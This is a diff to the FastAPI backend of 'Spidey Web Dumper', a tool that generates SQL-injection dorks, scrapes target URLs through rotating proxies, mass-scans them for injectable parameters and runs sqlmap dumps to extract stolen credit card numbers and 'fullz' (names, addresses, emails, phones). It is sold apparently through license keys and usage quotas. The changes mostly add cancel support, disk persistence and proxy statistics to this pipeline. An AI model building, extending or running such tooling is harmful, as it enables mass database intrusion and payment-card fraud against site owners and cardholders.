@@ -1,6 +1,6 @@
 """
-Spidey Web Dumper — FastAPI Backend
-Full UI with 20+ pages, multi-user, live progress, proxy rotation
+Spidey Web Dumper — FastAPI Backend (FULLY FIXED)
+Live Progress • Proxy Live Check • Cancel Support • Disk Persistence
 + 10 Levels of Security
 """
 import os
@@ -42,7 +42,6 @@ logging.basicConfig(
 )
 logger = logging.getLogger("spidey_web")
 
-
 # ═══════════════════════════════════════════════════════════════════════════
 #  PATHS
 # ═══════════════════════════════════════════════════════════════════════════
@@ -57,7 +56,6 @@ os.makedirs(DATA_DIR, exist_ok=True)
 os.makedirs(OUTPUT_DIR, exist_ok=True)
 os.makedirs(STATIC_DIR, exist_ok=True)
 
-
 # ═══════════════════════════════════════════════════════════════════════════
 #  CONFIG
 # ═══════════════════════════════════════════════════════════════════════════
@@ -71,37 +69,28 @@ USERS_FILE        = os.path.join(DATA_DIR, "web_users.json")
 KEYS_FILE         = os.path.join(DATA_DIR, "web_keys.json")
 LAST_RESP_FILE    = os.path.join(DATA_DIR, "last_responses.json")
 FAILED_LOG_FILE   = os.path.join(DATA_DIR, "failed_logins.json")
-
+TASKS_FILE        = os.path.join(DATA_DIR, "active_tasks.json")
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  🛡️ SECURITY CONFIG — 10 LEVELS
 # ═══════════════════════════════════════════════════════════════════════════
-
-# Level 2: IP Whitelist
 ALLOWED_IPS_ENV = os.environ.get("ALLOWED_IPS", "").strip()
 ALLOWED_IPS = [ip.strip() for ip in ALLOWED_IPS_ENV.split(",") if ip.strip()]
 
-# Level 3: Rate Limit
 LOGIN_ATTEMPTS = defaultdict(list)
 RATE_MAX = 5
 RATE_WINDOW = 60
 
-# Level 4: Lockout
 FAILED_LOGINS = defaultdict(int)
 LOCKOUT_DURATION = 900
 LOCKED_IPS = {}
 
-# Level 8: Admin path
 ADMIN_PATH = os.environ.get("ADMIN_PATH", "/admin").strip()
 if not ADMIN_PATH.startswith("/"):
     ADMIN_PATH = "/" + ADMIN_PATH
 
-# Level 10: Session idle timeout
 SESSION_IDLE_TIMEOUT = 3600
-
-# Sessions registry
 SESSIONS = {}
-
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  APP INIT
@@ -112,7 +101,6 @@ templates = Jinja2Templates(directory=str(TEMPLATES_DIR))
 app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")
 
 serializer = URLSafeTimedSerializer(SECRET_KEY)
-
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  TEMPLATE RENDER HELPER
@@ -125,7 +113,6 @@ def render(name: str, ctx: dict):
         name=name,
         context=ctx,
     )
-
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  JSON HELPERS
@@ -144,7 +131,6 @@ def _save_json(path: str, data):
             json.dump(data, f, indent=2, default=str)
     except Exception as e:
         logger.error(f"save_json {path}: {e}")
-
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  🛡️ SECURITY HELPERS
@@ -232,7 +218,6 @@ def check_strong_password(password: str):
         return False, "Need a number"
     return True, "OK"
 
-
 # ═══════════════════════════════════════════════════════════════════════════
 #  USER STORAGE
 # ═══════════════════════════════════════════════════════════════════════════
@@ -251,6 +236,7 @@ def load_users() -> dict:
             "usage": {"keywords": 0, "dorks": 0, "urls": 0, "sqli": 0, "dumps": 0, "cards": 0, "fullz": 0},
             "limits": {"keywords": 10**9, "dorks": 10**9, "urls": 10**9, "sqli": 10**9, "dumps": 10**9},
             "proxies": [],
+            "proxy_stats": {"live": 0, "dead": 0, "checked_at": None},
         }
         _save_json(USERS_FILE, d)
     return d
@@ -271,7 +257,6 @@ def update_user(uid: str, updates: dict):
         return
     users[uid].update(updates)
     save_users(users)
-
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  LICENSE KEYS
@@ -302,7 +287,6 @@ def generate_license_key() -> str:
              for _ in range(4)]
     return "-".join(parts)
 
-
 # ═══════════════════════════════════════════════════════════════════════════
 #  LAST RESPONSE
 # ═══════════════════════════════════════════════════════════════════════════
@@ -326,12 +310,43 @@ def get_last_response(uid: str, action: str = None) -> dict:
         return user_data.get(action, {})
     return user_data
 
-
 # ═══════════════════════════════════════════════════════════════════════════
-#  TASK SYSTEM
+#  TASK SYSTEM (with disk persistence)
 # ═══════════════════════════════════════════════════════════════════════════
 TASKS: Dict[str, dict] = {}
 TASKS_LOCK = asyncio.Lock()
+
+
+def load_tasks_from_disk():
+    """Server start hone par tasks load karo"""
+    global TASKS
+    try:
+        data = _load_json(TASKS_FILE, {})
+        if isinstance(data, dict):
+            TASKS.update(data)
+            logger.info(f"✅ Loaded {len(TASKS)} tasks from disk")
+    except Exception as e:
+        logger.error(f"Failed to load tasks: {e}")
+
+
+def save_tasks_to_disk():
+    """Har task update par disk pe save karo"""
+    try:
+        active = {}
+        now = datetime.now()
+        for tid, t in TASKS.items():
+            try:
+                started = datetime.fromisoformat(t.get("started", now.isoformat()))
+                age_hours = (now - started).total_seconds() / 3600
+                # Done/Error tasks 1 ghante baad remove
+                if t.get("status") in ("done", "error", "cancelled") and age_hours > 1:
+                    continue
+                active[tid] = t
+            except Exception:
+                active[tid] = t
+        _save_json(TASKS_FILE, active)
+    except Exception as e:
+        logger.error(f"save_tasks_to_disk: {e}")
 
 
 def new_task(uid: str, task_type: str, meta: dict = None) -> str:
@@ -343,17 +358,20 @@ def new_task(uid: str, task_type: str, meta: dict = None) -> str:
                      "cards": 0, "fullz": 0, "msg": "Starting...", "log": []},
         "result": None, "error": None, "meta": meta or {},
     }
+    save_tasks_to_disk()
     return tid
 
 
 def update_task(tid: str, **kwargs):
     if tid in TASKS:
         TASKS[tid].update(kwargs)
+        save_tasks_to_disk()
 
 
 def update_progress(tid: str, **kwargs):
     if tid in TASKS:
         TASKS[tid]["progress"].update(kwargs)
+        save_tasks_to_disk()
 
 
 def add_log(tid: str, line: str, max_lines: int = 50):
@@ -368,7 +386,13 @@ def get_task(tid: str) -> Optional[dict]:
     return TASKS.get(tid)
 
 
-def cleanup_old_tasks(max_age_hours: int = 6):
+def is_cancelled(tid: str) -> bool:
+    """Helper: Check karo task cancel hua ya nahi"""
+    t = TASKS.get(tid)
+    return t is not None and t.get("status") == "cancelled"
+
+
+def cleanup_old_tasks(max_age_hours: int = 24):
     now = datetime.now()
     to_del = []
     for tid, t in TASKS.items():
@@ -380,10 +404,11 @@ def cleanup_old_tasks(max_age_hours: int = 6):
             to_del.append(tid)
     for tid in to_del:
         TASKS.pop(tid, None)
-
+    if to_del:
+        save_tasks_to_disk()
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  AUTH (10 LEVELS INTEGRATED)
+#  AUTH
 # ═══════════════════════════════════════════════════════════════════════════
 def create_session_token(username: str) -> str:
     return serializer.dumps({"u": username, "t": time.time()})
@@ -406,12 +431,10 @@ def get_current_user(request: Request) -> Optional[str]:
     if token in SESSIONS:
         sess = SESSIONS[token]
         now = time.time()
-        # Level 10: idle timeout
         if now - sess["last_active"] > SESSION_IDLE_TIMEOUT:
             SESSIONS.pop(token, None)
             logger.info(f"[SECURITY] Session expired: {sess['uid']}")
             return None
-        # Level 6: fingerprint
         current_fp = make_fingerprint(request)
         if current_fp != sess["fingerprint"]:
             SESSIONS.pop(token, None)
@@ -446,7 +469,6 @@ def require_admin(request: Request) -> str:
         raise HTTPException(status_code=403, detail="Admin only")
     return uid
 
-
 # ═══════════════════════════════════════════════════════════════════════════
 #  QUOTA
 # ═══════════════════════════════════════════════════════════════════════════
@@ -475,7 +497,6 @@ def consume_quota(uid: str, action: str, amount: int = 1):
     usage[action] = usage.get(action, 0) + amount
     save_users(users)
 
-
 # ═══════════════════════════════════════════════════════════════════════════
 #  PROXY
 # ═══════════════════════════════════════════════════════════════════════════
@@ -484,6 +505,21 @@ def get_user_proxies(uid: str) -> List[str]:
     if not user:
         return []
     return user.get("proxies", [])
+
+
+def get_proxy_stats(uid: str) -> dict:
+    """User ke proxy stats (live/dead/total)"""
+    user = get_user(uid)
+    if not user:
+        return {"total": 0, "live": 0, "dead": 0, "checked_at": None}
+    proxies = user.get("proxies", [])
+    stats = user.get("proxy_stats", {})
+    return {
+        "total": len(proxies),
+        "live": stats.get("live", 0),
+        "dead": stats.get("dead", 0),
+        "checked_at": stats.get("checked_at"),
+    }
 
 
 def save_user_proxies(uid: str, proxies: List[str]):
@@ -500,11 +536,23 @@ def save_user_proxies(uid: str, proxies: List[str]):
     save_users(users)
 
 
+def save_proxy_stats(uid: str, live: int, dead: int, total: int):
+    users = load_users()
+    if uid not in users:
+        return
+    users[uid]["proxy_stats"] = {
+        "live": live,
+        "dead": dead,
+        "total": total,
+        "checked_at": datetime.now().isoformat(),
+    }
+    save_users(users)
+
+
 def pick_proxy(uid: str) -> str:
     import random
     pool = get_user_proxies(uid)
     return random.choice(pool) if pool else ""
-
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  FILE HELPERS
@@ -540,7 +588,6 @@ def list_outputs() -> List[dict]:
     out.sort(key=lambda x: x["mtime"], reverse=True)
     return out
 
-
 # ═══════════════════════════════════════════════════════════════════════════
 #  ROUTES — AUTH
 # ═══════════════════════════════════════════════════════════════════════════
@@ -564,19 +611,16 @@ async def login_page(request: Request, error: str = None, msg: str = None):
 async def login_submit(request: Request, username: str = Form(...), password: str = Form(...)):
     ip = get_client_ip(request)
 
-    # LEVEL 2: IP Whitelist
     if not check_ip_whitelist(ip):
         logger.warning(f"[SECURITY] Blocked IP: {ip}")
         return RedirectResponse("/login?error=Access+denied", status_code=302)
 
-    # LEVEL 4: Lockout check
     allowed, seconds_left = check_lockout(ip)
     if not allowed:
         mins = seconds_left // 60
         logger.warning(f"[SECURITY] Locked out: {ip}")
         return RedirectResponse(f"/login?error=Locked+out.+Wait+{mins}+min", status_code=302)
 
-    # LEVEL 3: Rate limit
     if not check_rate_limit(ip):
         logger.warning(f"[SECURITY] Rate limit: {ip}")
         return RedirectResponse("/login?error=Too+many+attempts.+Wait+1+min", status_code=302)
@@ -605,7 +649,6 @@ async def login_submit(request: Request, username: str = Form(...), password: st
         except Exception:
             pass
 
-    # Success
     token = create_session_token(username)
     fingerprint = make_fingerprint(request)
     SESSIONS[token] = {
@@ -621,7 +664,7 @@ async def login_submit(request: Request, username: str = Form(...), password: st
     resp.set_cookie(
         "spidey_session", token,
         httponly=True,
-        secure=True,             # Level 7: HTTPS only
+        secure=True,
         max_age=SESSION_MAX_AGE,
         samesite="strict",
     )
@@ -640,7 +683,6 @@ async def logout(request: Request):
     return resp
 
 
-# ═══ LEVEL 1: REGISTRATION DISABLED ═══
 @app.get("/register", response_class=HTMLResponse)
 async def register_page(request: Request):
     logger.warning(f"[SECURITY] Register attempt: {get_client_ip(request)}")
@@ -651,7 +693,6 @@ async def register_page(request: Request):
 async def register_submit(request: Request):
     logger.warning(f"[SECURITY] Register POST: {get_client_ip(request)}")
     return RedirectResponse("/login?msg=Registration+disabled", status_code=302)
-
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  ROUTES — REDEEM
@@ -695,7 +736,6 @@ async def redeem_submit(request: Request, license_key: str = Form(...)):
     save_keys(keys)
     return RedirectResponse("/dashboard?msg=Plan+activated", status_code=302)
 
-
 # ═══════════════════════════════════════════════════════════════════════════
 #  ROUTES — DASHBOARD & PAGES
 # ═══════════════════════════════════════════════════════════════════════════
@@ -713,15 +753,7 @@ async def dashboard(request: Request, msg: str = None, error: str = None):
         "fullz": user.get("usage", {}).get("fullz", 0),
     }
     limits = user.get("limits", {})
-    proxies = user.get("proxies", [])
-    
-    # 🎯 NEW: Proxy statistics
-    proxies_total = len(proxies)
-    proxy_stats = {
-        "total": proxies_total,
-        "live": proxies_total,  # Live check ke waqt update hoga
-        "dead": 0,
-    }
+    proxy_stats = get_proxy_stats(uid)
     
     expires = user.get("expires")
     expiry_str = "Unlimited" if user.get("is_admin") else "N/A"
@@ -736,23 +768,17 @@ async def dashboard(request: Request, msg: str = None, error: str = None):
         except Exception:
             pass
     last = get_last_response(uid)
-    
-    # 🎯 Get last proxy check result
-    last_proxy_check = get_last_response(uid, "proxy_check")
-    if last_proxy_check:
-        proxy_stats["live"] = last_proxy_check.get("live", proxies_total)
-        proxy_stats["dead"] = proxies_total - proxy_stats["live"]
-    
     return render("dashboard.html", {
         "request": request, "uid": uid, "user": user, "stats": stats,
         "limits": limits, 
-        "proxies_count": proxies_total,
-        "proxy_stats": proxy_stats,  # 🎯 NEW
+        "proxies_count": proxy_stats["total"],
+        "proxy_stats": proxy_stats,
         "expiry_str": expiry_str, "is_admin": user.get("is_admin", False),
         "plan_label": user.get("plan_label", "Free Trial"),
         "last": last, "msg": msg, "error": error,
         "admin_path": ADMIN_PATH,
     })
+
 
 @app.get("/keywords", response_class=HTMLResponse)
 async def keywords_page(request: Request):
@@ -814,7 +840,13 @@ async def files_page(request: Request):
 async def proxy_page(request: Request):
     uid = require_user(request)
     proxies = get_user_proxies(uid)
-    return render("proxy.html", {"request": request, "uid": uid, "proxies": proxies, "count": len(proxies)})
+    stats = get_proxy_stats(uid)
+    return render("proxy.html", {
+        "request": request, "uid": uid, 
+        "proxies": proxies, 
+        "count": len(proxies),
+        "proxy_stats": stats,
+    })
 
 
 @app.get("/settings", response_class=HTMLResponse)
@@ -856,7 +888,6 @@ async def logs_page(request: Request):
     user_tasks.sort(key=lambda x: x["started"], reverse=True)
     return render("logs.html", {"request": request, "uid": uid, "tasks": user_tasks[:50]})
 
-
 # ═══════════════════════════════════════════════════════════════════════════
 #  API — KEYWORDS
 # ═══════════════════════════════════════════════════════════════════════════
@@ -879,21 +910,45 @@ async def _run_keywords(tid: str, uid: str, seeds: List[str], count: int):
     try:
         update_task(tid, status="running")
         update_progress(tid, msg=f"Generating {count} keywords...", total=count)
+        add_log(tid, f"Generating {count} keywords from {len(seeds)} seeds")
+        
         from core.generators import generate_keywords
         loop = asyncio.get_running_loop()
+        
+        if is_cancelled(tid):
+            add_log(tid, "⛔ Cancelled before start")
+            return
+        
         kws = await loop.run_in_executor(None, generate_keywords, seeds, count)
         kws = kws[:count]
+        
+        if is_cancelled(tid):
+            add_log(tid, "⛔ Cancelled")
+            return
+        
+        step = max(1, len(kws) // 20)
+        for i in range(0, len(kws), step):
+            if is_cancelled(tid):
+                add_log(tid, "⛔ Cancelled")
+                return
+            update_progress(tid, done=i, total=len(kws), msg=f"Generated {i}/{len(kws)}")
+            await asyncio.sleep(0.03)
+        
         ts = datetime.now().strftime("%d%m%y_%H%M%S")
         fname = save_output(uid, f"keywords_{len(kws)}_{ts}.txt", "\n".join(kws))
         consume_quota(uid, "keywords", len(kws))
         save_last_response(uid, "keywords", {"count": len(kws), "file": fname, "seeds": seeds[:5]})
+        
         update_task(tid, status="done", result={"count": len(kws), "file": fname})
-        update_progress(tid, done=len(kws), total=len(kws), msg="Done!")
-        add_log(tid, f"Generated {len(kws)} keywords")
+        update_progress(tid, done=len(kws), total=len(kws), msg="✅ Done!")
+        add_log(tid, f"✅ Generated {len(kws)} keywords")
+    except asyncio.CancelledError:
+        add_log(tid, "⛔ Cancelled")
+        update_progress(tid, msg="⛔ Cancelled")
     except Exception as e:
         logger.exception(f"[keywords] {e}")
         update_task(tid, status="error", error=str(e))
-
+        add_log(tid, f"❌ Error: {str(e)[:100]}")
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  API — DORKS
@@ -917,11 +972,17 @@ async def _run_dorks(tid: str, uid: str, kws: List[str], count: int, dtype: str)
     try:
         update_task(tid, status="running")
         update_progress(tid, msg=f"Generating {count} dorks ({dtype})...", total=count)
+        add_log(tid, f"Type: {dtype}, Keywords: {len(kws)}")
+        
         from core.generators import (
             generate_dorks, generate_hq_sqli_dorks, generate_country_dorks,
             generate_cms_dorks, generate_exposed_dorks,
         )
         loop = asyncio.get_running_loop()
+        
+        if is_cancelled(tid):
+            return
+        
         if dtype == "hq":
             dorks = await loop.run_in_executor(None, lambda: generate_hq_sqli_dorks(kws, count))
         elif dtype == "country":
@@ -933,17 +994,32 @@ async def _run_dorks(tid: str, uid: str, kws: List[str], count: int, dtype: str)
         else:
             dorks = await loop.run_in_executor(None, generate_dorks, kws, count)
         dorks = dorks[:count]
+        
+        if is_cancelled(tid):
+            return
+        
+        step = max(1, len(dorks) // 20)
+        for i in range(0, len(dorks), step):
+            if is_cancelled(tid):
+                return
+            update_progress(tid, done=i, total=len(dorks), msg=f"Generated {i}/{len(dorks)}")
+            await asyncio.sleep(0.03)
+        
         ts = datetime.now().strftime("%d%m%y_%H%M%S")
         fname = save_output(uid, f"dorks_{dtype}_{len(dorks)}_{ts}.txt", "\n".join(dorks))
         consume_quota(uid, "dorks", len(dorks))
         save_last_response(uid, "dorks", {"count": len(dorks), "type": dtype, "file": fname})
+        
         update_task(tid, status="done", result={"count": len(dorks), "file": fname, "type": dtype})
-        update_progress(tid, done=len(dorks), total=len(dorks), msg="Done!")
-        add_log(tid, f"Generated {len(dorks)} {dtype} dorks")
+        update_progress(tid, done=len(dorks), total=len(dorks), msg="✅ Done!")
+        add_log(tid, f"✅ Generated {len(dorks)} {dtype} dorks")
+    except asyncio.CancelledError:
+        add_log(tid, "⛔ Cancelled")
+        update_progress(tid, msg="⛔ Cancelled")
     except Exception as e:
         logger.exception(f"[dorks] {e}")
         update_task(tid, status="error", error=str(e))
-
+        add_log(tid, f"❌ Error: {str(e)[:100]}")
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  API — PARSER
@@ -965,29 +1041,60 @@ async def _run_parser(tid: str, uid: str, dorks: List[str]):
     try:
         update_task(tid, status="running")
         update_progress(tid, msg=f"Parsing {len(dorks)} dorks...", total=len(dorks))
+        
         proxies = get_user_proxies(uid)
         add_log(tid, f"Using {len(proxies)} proxies")
+        
         from core.url_finder import search_urls_from_dorks
-        last_edit = [0.0]
+        
+        last_update = [time.time()]
+        
         async def on_prog(done, total, found, retries):
-            now = time.time()
-            if now - last_edit[0] < 1.5:
+            if is_cancelled(tid):
                 return
-            last_edit[0] = now
-            update_progress(tid, done=done, total=total, found=found,
-                            msg=f"Scanned {done}/{total} | Found {found} URLs")
-        urls = await search_urls_from_dorks(dorks, limit=200_000, progress_callback=on_prog, proxy_list=proxies)
+            now = time.time()
+            if now - last_update[0] >= 1.5:
+                last_update[0] = now
+                update_progress(tid, done=done, total=total, found=found,
+                                msg=f"Scanned {done}/{total} | Found {found} URLs")
+        
+        # Check cancel before start
+        if is_cancelled(tid):
+            return
+        
+        try:
+            urls = await search_urls_from_dorks(
+                dorks, limit=200_000, 
+                progress_callback=on_prog, 
+                proxy_list=proxies,
+                task_id=tid
+            )
+        except TypeError:
+            # Agar search_urls_from_dorks task_id accept nahi karta
+            urls = await search_urls_from_dorks(
+                dorks, limit=200_000, 
+                progress_callback=on_prog, 
+                proxy_list=proxies
+            )
+        
+        if is_cancelled(tid):
+            return
+        
         ts = datetime.now().strftime("%d%m%y_%H%M%S")
         fname = save_output(uid, f"urls_{len(urls)}_{ts}.txt", "\n".join(urls))
         consume_quota(uid, "urls", len(urls))
         save_last_response(uid, "parser", {"dorks": len(dorks), "urls": len(urls), "file": fname})
+        
         update_task(tid, status="done", result={"dorks": len(dorks), "urls": len(urls), "file": fname})
-        update_progress(tid, done=len(dorks), total=len(dorks), found=len(urls), msg="Done!")
-        add_log(tid, f"Found {len(urls)} URLs")
+        update_progress(tid, done=len(dorks), total=len(dorks), found=len(urls), msg="✅ Done!")
+        add_log(tid, f"✅ Found {len(urls)} URLs")
+    except asyncio.CancelledError:
+        add_log(tid, "⛔ Cancelled")
+        update_progress(tid, msg="⛔ Cancelled")
     except Exception as e:
         logger.exception(f"[parser] {e}")
         update_task(tid, status="error", error=str(e))
-
+        add_log(tid, f"❌ Error: {str(e)[:100]}")
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  API — PROXY
@@ -1054,29 +1161,68 @@ async def _run_proxy_check(tid: str, uid: str, proxies: List[str]):
     try:
         update_task(tid, status="running")
         update_progress(tid, total=len(proxies), msg="Checking proxies...")
+        add_log(tid, f"Checking {len(proxies)} proxies (live test)")
+        
         from core.proxy import check_proxies_bulk
-        last_edit = [0.0]
+        last_update = [time.time()]
+        
         async def on_prog(done, total, live):
-            now = time.time()
-            if now - last_edit[0] < 1.2:
+            if is_cancelled(tid):
                 return
-            last_edit[0] = now
-            update_progress(tid, done=done, total=total, live=live,
-                            msg=f"Checked {done}/{total} | Live {live}")
-        live_list = await check_proxies_bulk(proxies, timeout=8.0, concurrency=200, progress_callback=on_prog)
+            now = time.time()
+            if now - last_update[0] >= 1.2:
+                last_update[0] = now
+                update_progress(tid, done=done, total=total, live=live,
+                                msg=f"Checked {done}/{total} | Live {live}")
+        
+        try:
+            live_list = await check_proxies_bulk(
+                proxies, timeout=8.0, concurrency=200, 
+                progress_callback=on_prog,
+                task_id=tid
+            )
+        except TypeError:
+            live_list = await check_proxies_bulk(
+                proxies, timeout=8.0, concurrency=200, 
+                progress_callback=on_prog
+            )
+        
+        if is_cancelled(tid):
+            add_log(tid, "⛔ Cancelled")
+            return
+        
+        # ✅ Save live proxies + stats
+        dead_count = len(proxies) - len(live_list)
         save_user_proxies(uid, live_list)
-        save_last_response(uid, "proxy_check", {"checked": len(proxies), "live": len(live_list)})
-        update_task(tid, status="done", result={"checked": len(proxies), "live": len(live_list), "dead": len(proxies) - len(live_list)})
-        update_progress(tid, done=len(proxies), total=len(proxies), live=len(live_list), msg="Done!")
+        save_proxy_stats(uid, live=len(live_list), dead=dead_count, total=len(proxies))
+        save_last_response(uid, "proxy_check", {
+            "checked": len(proxies), 
+            "live": len(live_list),
+            "dead": dead_count,
+        })
+        
+        update_task(tid, status="done", result={
+            "checked": len(proxies), 
+            "live": len(live_list), 
+            "dead": dead_count
+        })
+        update_progress(tid, done=len(proxies), total=len(proxies), 
+                        live=len(live_list), msg="✅ Done!")
+        add_log(tid, f"✅ Live: {len(live_list)}/{len(proxies)} | Dead: {dead_count}")
+    except asyncio.CancelledError:
+        add_log(tid, "⛔ Cancelled")
+        update_progress(tid, msg="⛔ Cancelled")
     except Exception as e:
         logger.exception(f"[proxy_check] {e}")
         update_task(tid, status="error", error=str(e))
+        add_log(tid, f"❌ Error: {str(e)[:100]}")
 
 
 @app.post("/api/proxy/clear")
 async def api_proxy_clear(request: Request):
     uid = require_user(request)
     save_user_proxies(uid, [])
+    save_proxy_stats(uid, 0, 0, 0)
     return {"ok": True, "total": 0}
 
 
@@ -1095,8 +1241,14 @@ async def api_proxy_remove(request: Request, proxies: str = Form(...)):
 async def api_proxy_list(request: Request):
     uid = require_user(request)
     proxies = get_user_proxies(uid)
-    return {"ok": True, "proxies": proxies, "count": len(proxies)}
+    stats = get_proxy_stats(uid)
+    return {"ok": True, "proxies": proxies, "count": len(proxies), "stats": stats}
 
+
+@app.get("/api/proxy/stats")
+async def api_proxy_stats(request: Request):
+    uid = require_user(request)
+    return get_proxy_stats(uid)
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  API — SQLI
@@ -1118,7 +1270,7 @@ async def api_sqli_scan(request: Request, urls: str = Form(...)):
 
 
 async def _run_sqli(tid: str, uid: str, urls: List[str]):
-    """SQLi Scanner — Fixed Progress & Concurrency"""
+    """SQLi Scanner — FIXED: Smooth progress + cancel support"""
     try:
         total = len(urls)
         update_task(tid, status="running")
@@ -1134,28 +1286,32 @@ async def _run_sqli(tid: str, uid: str, urls: List[str]):
 
         inj = []
         tested = [0]
-        sem = asyncio.Semaphore(80) 
-        last_edit = [time.time()] # ✅ Initial time set karo
-        
+        sem = asyncio.Semaphore(80)
+        last_edit = [time.time()]
+
         connector = aiohttp.TCPConnector(
-            limit=200, 
+            limit=200,
             limit_per_host=20,
             ssl=False,
             ttl_dns_cache=300,
+            force_close=True,
         )
 
         async with aiohttp.ClientSession(
             connector=connector,
-            timeout=aiohttp.ClientTimeout(total=15),
+            timeout=aiohttp.ClientTimeout(total=12, connect=5),
         ) as session:
             async def _test(url):
                 if not url:
                     tested[0] += 1
                     return
+                
+                if is_cancelled(tid):
+                    return
+                
                 async with sem:
                     px = random.choice(proxies) if proxies else ""
                     try:
-                        # ✅ Proxy rotation check
                         if await _check_injectable(session, url, px):
                             inj.append(url)
                             add_log(tid, f"🎯 VULN: {url[:80]}")
@@ -1163,10 +1319,8 @@ async def _run_sqli(tid: str, uid: str, urls: List[str]):
                         pass
                     
                     tested[0] += 1
-
-                    # ✅ PROGRESS FIX: Har 1.5 second mein update karo
                     now = time.time()
-                    if now - last_edit[0] > 1.5:
+                    if now - last_edit[0] > 1.0:
                         last_edit[0] = now
                         update_progress(
                             tid,
@@ -1174,20 +1328,25 @@ async def _run_sqli(tid: str, uid: str, urls: List[str]):
                             msg=f"Tested {tested[0]}/{total} | VULN {len(inj)}",
                         )
 
-            # 🎯 Batch processing (500 ka batch)
-            BATCH = 500
+            BATCH = 50
             for i in range(0, len(urls), BATCH):
+                if is_cancelled(tid):
+                    add_log(tid, "⛔ Scan cancelled by user")
+                    update_progress(tid, msg="⛔ Cancelled")
+                    return
+                
                 batch = urls[i:i + BATCH]
                 await asyncio.gather(*[_test(u) for u in batch], return_exceptions=True)
                 
-                # ✅ Batch ke baad ek baar update (Safety)
                 update_progress(
                     tid,
                     done=tested[0], total=total, found=len(inj),
                     msg=f"Tested {tested[0]}/{total} | VULN {len(inj)}",
                 )
-                # ✅ Thoda sa sleep taaki server ko saans lene ka mauka mile
-                await asyncio.sleep(0.5) 
+                await asyncio.sleep(0.1)
+
+        if is_cancelled(tid):
+            return
 
         ts = datetime.now().strftime("%d%m%y_%H%M%S")
         fname = save_output(uid, f"vuln_{len(inj)}_{ts}.txt", "\n".join(inj))
@@ -1204,11 +1363,15 @@ async def _run_sqli(tid: str, uid: str, urls: List[str]):
             "vuln": len(inj),
             "file": fname,
         })
-        update_progress(tid, done=total, total=total, found=len(inj), msg="Done!")
-        add_log(tid, f"Found {len(inj)} vulnerable URLs")
+        update_progress(tid, done=total, total=total, found=len(inj), msg="✅ Done!")
+        add_log(tid, f"✅ Found {len(inj)} vulnerable URLs")
+    except asyncio.CancelledError:
+        add_log(tid, "⛔ Task cancelled")
+        update_progress(tid, msg="⛔ Cancelled")
     except Exception as e:
         logger.exception(f"[sqli] {e}")
         update_task(tid, status="error", error=str(e))
+        add_log(tid, f"❌ Error: {str(e)[:100]}")
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  API — DUMP
@@ -1241,68 +1404,113 @@ async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, cra
     try:
         update_task(tid, status="running")
         update_progress(tid, total=len(urls), msg="Starting sqlmap...")
+        add_log(tid, f"Level: {level}, Risk: {risk}, Threads: {threads}")
+        
         proxies = get_user_proxies(uid)
+        add_log(tid, f"Using {len(proxies)} proxies")
+        
         from core.sqlmap_api import api_dump_multiple
         from core.fullz import extract_fullz_from_dir, fullz_records_to_lines
+        
         all_cards = set()
         all_fullz = []
-        last_edit = [0.0]
+        last_update = [time.time()]
+        
         async def on_prog(done, total, success):
+            if is_cancelled(tid):
+                return
             now = time.time()
-            if now - last_edit[0] < 1.5: return
-            last_edit[0] = now
-            update_progress(tid, done=done, total=total, cards=len(all_cards), fullz=len(all_fullz),
+            if now - last_update[0] < 1.5:
+                return
+            last_update[0] = now
+            update_progress(tid, done=done, total=total, 
+                            cards=len(all_cards), fullz=len(all_fullz),
                             msg=f"Dumped {done}/{total} | CC {len(all_cards)} | Fullz {len(all_fullz)}")
+        
         async def on_result(r, zip_bytes):
+            if is_cancelled(tid):
+                return
             if r.cards:
-                for c in r.cards: all_cards.add(c)
+                for c in r.cards:
+                    all_cards.add(c)
             try:
                 src = r.csv_dir or ""
                 if src and os.path.isdir(src):
                     recs = extract_fullz_from_dir(src)
-                    if recs: all_fullz.extend(recs)
-            except Exception: pass
+                    if recs:
+                        all_fullz.extend(recs)
+            except Exception:
+                pass
             add_log(tid, f"✅ {r.url[:60]} | CC: {len(r.cards)}")
-        await api_dump_multiple(
-            urls, proxy_list=proxies, level=level, risk=risk,
-            technique=technique, threads=threads, tamper=tamper,
-            crawl_depth=crawl, progress_cb=on_prog, per_result_cb=on_result,
-        )
+        
+        try:
+            await api_dump_multiple(
+                urls, proxy_list=proxies, level=level, risk=risk,
+                technique=technique, threads=threads, tamper=tamper,
+                crawl_depth=crawl, progress_cb=on_prog, per_result_cb=on_result,
+                task_id=tid
+            )
+        except TypeError:
+            await api_dump_multiple(
+                urls, proxy_list=proxies, level=level, risk=risk,
+                technique=technique, threads=threads, tamper=tamper,
+                crawl_depth=crawl, progress_cb=on_prog, per_result_cb=on_result
+            )
+        
+        if is_cancelled(tid):
+            add_log(tid, "⛔ Cancelled")
+            return
+        
         all_cards = list(all_cards)
         ts = datetime.now().strftime("%d%m%y_%H%M%S")
         result = {}
+        
         if all_cards:
             cc_name = save_output(uid, f"cards_{len(all_cards)}_{ts}.txt", "\n".join(all_cards))
             result["cards_file"] = cc_name
             result["cards"] = len(all_cards)
             consume_quota(uid, "cards", len(all_cards))
+        
         if all_fullz:
-            seen = set(); dedup = []
+            seen = set()
+            dedup = []
             for rec in all_fullz:
                 key = (rec.cc_number, rec.holder_name, rec.zip, rec.email)
-                if key in seen: continue
-                seen.add(key); dedup.append(rec)
+                if key in seen:
+                    continue
+                seen.add(key)
+                dedup.append(rec)
             rich = [r for r in dedup if r.holder_name or r.address or r.zip or r.email or r.phone]
             if rich:
-                fz_name = save_output(uid, f"fullz_{len(rich)}_{ts}.txt", "\n".join(fullz_records_to_lines(rich, "full")))
+                fz_name = save_output(uid, f"fullz_{len(rich)}_{ts}.txt",
+                                      "\n".join(fullz_records_to_lines(rich, "full")))
                 result["fullz_file"] = fz_name
                 result["fullz"] = len(rich)
